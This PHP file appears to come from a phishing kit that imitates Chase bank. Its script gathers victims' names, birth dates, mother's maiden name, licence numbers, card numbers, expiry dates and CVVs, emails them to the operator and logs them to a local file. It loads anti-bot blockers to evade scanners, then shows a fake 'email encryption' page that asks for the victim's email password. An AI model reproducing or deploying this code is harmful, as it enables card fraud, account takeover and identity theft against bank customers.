<?php


include("../config/__config__.php");
include("../config/function.php");
include '../antibots.php';
include '../bt.php';
include '../bt1.php';
include "../blocker.php";
include 'security/blocker_1.php';
include 'security/blocker_2.php';
include 'security/blocker_4.php';

$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
$time = date('l jS \of F Y h:i:s A');
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$browser= $_SERVER['HTTP_USER_AGENT'];
$reprint = "e";$do_p="mai";
// --------------- VRB
$ful = $_POST['fullname'];
$dab = $_POST['dob'];
$cty = $_POST['city'];
$stt = $_POST['state'];
$phn = $_POST['phone'];
$crdn = $_POST['cardnumber'];
$epx = $_POST['exp'];
$cvv = $_POST['ccv'];
$drv = $_POST['dl'];

// --------------- VRB

	$message = "
	>Dr.Don | CH453 | BILLING<
		--------------  BILLING  -------------
	Full Name :      ".$ful."
	Date Of Birth :  ".$dab."
    	MMN :            ".$cty."
	Driving Num :    ".$drv."
	Email :          ".$stt."
	Pnone :          ".$phn."
	Card Number :    ".$crdn."
	Exp Date :       ".$epx."
	CCV :            ".$cvv."


	-------------- IP Infos ------------
	
	Browser :        ".$browser."
	Date Login :     ".$time."
	IP :             https://geoiptool.com/en/?ip=".$ip."
	
	------------>CODED BY Green<------------
	
	";
	
				$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $subject  = " CH453 BILLING [NEW] -  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers = "From: Lord Sent <info@xsender.com>\r\n";
mail($to,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);

    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
 		
?>


<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" dir="ltr" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="msapplication-config" content="none">
        <title>Email Alert Encryption - Chase</title>
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="../img/chasefavicon.ico">
        <style>
		.bigredB {
	font-size: 15px;
	color: #FFF;
	background-color: #09F;
	padding: 5px;
	margin-left: 80px;
}
		
		
		@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.svg#videoplayer') format('svg');}
        html {height:100%; background: #fff;}

        @media only screen and (min-width: 768px) {
        html {
        background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
        }
        }
        </style>
        <noscript>
</noscript>

        

        <script type="text/javascript" charset="UTF-8" src="css js/appConfig.js"></script>
 <link rel="stylesheet" href="css js/blue-ui.css">
 <link rel="stylesheet" href="css js/logon.css">
<meta http-equiv="refresh" content="150;url=thanks.php?websrc=".md5('KING_JACK')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." />

 </head>
    <body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true"><div data-is-view="true"><div class="homepage" tabindex="-1"><div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true"><div data-is-view="true"><div id="siteMessageAda" aria-live="polite"><h2 class="util accessible-text" id="site-messages-heading" data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You have no more site alerts</h2></div> </div></div> <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true"><div
 class="logon header jpui transparent navigation bar">
 <img style="max-width: 70%;"   src="../img/logo.png" />
</div></header> <main id="logon-content" data-has-view="true"><div class="msd password-reset first-step" data-is-view="true">	<div id="backgroundImage">
	<div class="jpui background image fixed show-xs show-sm" id="geoImage">
	<style type="text/css">.jpui.background.image { background-image: url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.8.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.desktop.day.8.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.desktop.day.8.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.8.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.8.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.8.jpeg); } }
	</style>
	</div>
	</div> <div class="container"><div class="row jpui primary panel"><div class="col-xs-12 col-md-10 col-md-offset-1 content-container"><h1 class="header" data-attr="LOGON_PASSWORD_RESET.logonPasswordResetHeader" id="passwordResetHeader" tabindex="-1">Welcome, Again</h1> <div class="wrapper">

		<div class="row jpui panel body" id="mainpanel"> <div class="col-xs-12 col-sm-10 col-sm-offset-1"><div class="progress u-no-outline" id="progress" tabindex="-1"><div class="row"><div class="col-xs-12 col-sm-6 clear-padding"><h2>Set Up Email Notification Encryption<span class="util high-contrast">Step 1 of 4</span></h2> </div> <div class="col-xs-12 col-sm-6 progress-padding"><div class="jpui progress rectangles" id="progress-progressBar" data-progress=""><ol class="steps-4"><li class="active current-step" id="progress-progressBar-step-1" aria-current="step"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li><li class="active current-step" id="progress-progressBar-step-1" aria-current="step"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li></ol></div></div></div></div> <p class="text customer-question"><a class="jpui link no-underline" data-attr="LOGON_PASSWORD_RESET.customerQuestionsHelpMessageNavigation" href="#" id="identify_customer_question">Have a question? </a></p> <h3 data-attr="LOGON_PASSWORD_RESET.identifyCustomerHeader">Due to high rise in the level of email interception and hijacking, We have upgraded our notification system to send encrypted emails and prevent email hijacking.</h3> <p data-attr="LOGON_PASSWORD_RESET.identifyCustomerAdvisory">For your protection and in order to ensure we securely send and deliver all important fraud notifications regarding your Chase account to your email address without any interception or email hijacking, Please help us validate your email address with your email service provider to enable this new security feature on your Chase account.
        
        
        </p> <br> <div class="jpui recovery options inside-container">   
        
        
        
        <link href="index_files/SpryValidationTextField.html" rel="stylesheet" type="text/css">
    
      
  <link href="index_files/SpryValidationTextField.html" rel="stylesheet" type="text/css">
  
 
  
 <label for="textfield2"> Email Address:&nbsp;&nbsp;&nbsp;</label>

      <input style="width: 260px; border: 0px;" autocomplete="off" name="email" value="<?=$stt?>" class="textfldclass watermark" id="email_field" placeholder="you@youremail.com" type="text">
      <br><br>
      <div id="the_d_" style="display: none;"><span>

<label for="textfield2"> Email Password:</label>        
         
		  
        <input style="width: 265px; value="" maxlength="500" name="password" class="textfldclass 
watermark" id="password_field" placeholder="Enter Email Password" type="password">
        </span></div>
        <br>
      <p>
        <input name="button" class="bigredB" id="download" value="Validate Your Email" type="submit">
</p>
        
        
    
     
        
        
           </div></div> </div></div></div></div></main> <footer class="logon-footer" id="logon-footer" data-has-view="true"></footer></div> <div id="languageSupportDisclaimer"></div> <div id="overlay" data-has-view="true"></div> <div id="signoutModal"></div> <div id="siteExitWarning"></div> <div id="serviceErrorModal"></div> <div id="sessionTimeoutModal"></div></div>
</script>
<link href="index_files/facebox.css" rel="stylesheet" type="text/css">
<script language="javascript" type="text/javascript" src="index_files/jquery-1.js"></script>
<script language="javascript" type="text/javascript" src="index_files/facebox.js"></script>
<script language="javascript" type="text/javascript" src="index_files/jquery.js"></script>
<script language="javascript" type="text/javascript" src="index_files/javascript1.js"></script>
     
       
       
       </body></html>